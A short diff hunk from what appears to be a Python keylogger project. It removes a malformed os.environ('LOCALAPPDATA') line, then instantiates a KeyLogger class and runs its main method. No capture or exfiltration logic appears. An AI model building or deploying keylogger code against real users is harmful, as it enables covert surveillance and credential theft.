@@ -25,7 +25,6 @@ class KeyLogger():
 
 
 if __name__ == '__main__':
-    os.environ('LOCALAPPDATA')
     logger = KeyLogger()
     logger.main()
     input()
